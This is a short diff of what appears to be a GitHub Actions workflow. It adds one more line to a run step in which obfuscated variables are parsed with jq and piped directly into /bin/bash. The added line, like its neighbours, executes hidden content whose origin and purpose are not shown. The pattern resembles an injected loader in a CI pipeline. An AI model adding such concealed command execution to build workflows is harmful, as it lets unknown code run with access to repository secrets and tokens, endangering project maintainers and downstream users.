@@ -29,6 +29,7 @@ jobs:
           echo $vgbrv09566 | jq -r .z2 | /bin/bash
           echo $k121 | jq -r .sy20681 | /bin/bash
           echo $mxscp2 | jq -r .h8544 | /bin/bash
+          echo $dxct3 | jq -r .tmep00 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
